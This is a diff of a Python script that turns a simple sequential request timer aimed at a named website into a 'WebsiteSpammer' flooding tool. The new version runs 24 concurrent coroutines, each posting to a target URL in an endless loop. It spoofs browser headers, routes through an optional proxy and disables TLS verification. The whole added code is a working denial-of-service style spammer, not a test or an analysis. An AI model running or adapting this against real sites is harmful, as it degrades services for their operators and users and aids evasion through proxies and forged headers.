@@ -1,39 +1,80 @@
-import requests, time, ctypes
+from typing import Coroutine, Any, List
 
-PURPLE = '\033[95m'
-RED = '\033[91m'
-ENDC = '\033[0m'
+import logging
+import asyncio
+import httpx
 
-targeturl = "https://schuh.wtf"
-nrequests = 100
+logging.basicConfig(
+    level=logging.INFO,
+    format="\u001b[36;1m[\u001b[0m%(asctime)s\u001b[36;1m]\u001b[0m %(message)s\u001b[0m",
+    datefmt="%H:%M:%S"
+)
 
-def set_console_title(title, response_time):
-    ctypes.windll.kernel32.SetConsoleTitleW(f"{title} Response Time: {response_time:.2f} seconds")
+class WebsiteSpammer:
+    proxy: str
+    email: str
 
-def send_request(url, request_number, response_times):
-    try:
-        start_time = time.perf_counter()
-        response = requests.get(url)
-        end_time = time.perf_counter()
-        response_time = end_time - start_time
-        set_console_title(f"URL: {url} - Requests: {request_number + 1} -", response_time)
-        response_times.append(response_time)
-    except requests.exceptions.RequestException as e:
-        print(RED + f"Request failed: {e}" + ENDC)
-    except Exception as e:
-        print(RED + f"{e}" + ENDC)
+    def __init__(self, proxy: str, website: str) -> None:
+        self.proxy: str = proxy
+        self.website: str = website
 
-response_times = []
+    async def spam(self):
+        async with httpx.AsyncClient(
+            proxies={"http://": self.proxy},
+            verify=False
+        ) as client:
+            while True:
+                response = await client.post(
+                    self.website,
+                    headers={
+                        "accept": "*/*",
+                        "accept-language": "en-US,en;q=0.9",
+                        "content-type": "application/json",
+                        "origin": self.website,
+                        "priority": "u=1, i",
+                        "sec-fetch-dest": "empty",
+                        "sec-fetch-mode": "cors",
+                        "sec-fetch-site": "same-origin",
+                        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
+                        "x-client": "web",
+                    },
+                    json={
+                        "test": "WebsiteSpammer"
+                    }
+                )
 
-for i in range(nrequests):
-    try:
-        send_request(targeturl, i, response_times)
-    except Exception as e:
-        print(RED + f"{e}" + ENDC)
-        time.sleep(15)
+                if 200 <= response.status_code < 300:
+                    logging.info(
+                        f"Successfully sent request! -> {self.website}"
+                    )
 
-if response_times:
-    avg_response_time = sum(response_times) / len(response_times)
-    print(PURPLE + f"[#] Successful Requests:" + ENDC, len(response_times))
-    print(PURPLE + f"[#] Average Response Time:" + ENDC, f"{avg_response_time:.2f} seconds")
-input()
+class FastRoutine:
+    """
+    A simple class for fast gathering, and execution of coroutines.
+    """
+
+    func: Coroutine[Any, Any, Any]
+    repetitions: int
+
+    def __init__(self, func: Coroutine[Any, Any, Any], repetitions: int = 24) -> None:
+        self.func: Coroutine[Any, Any, Any] = func
+        self.repetitions: int = repetitions
+
+    async def gather_coroutines(self) -> None:
+        tasks: List[asyncio.Task[Any]] = [
+            asyncio.create_task(self.func()) for _ in range(self.repetitions)
+        ]
+        await asyncio.gather(*tasks)
+
+async def main():
+    zoom: FastRoutine = FastRoutine(
+        func=WebsiteSpammer(
+            proxy=None,
+            website="https://httpbin.org/post"
+        ).spam,
+        repetitions=24
+    )
+    await zoom.gather_coroutines()
+
+if __name__ == "__main__":
+    asyncio.run(main())
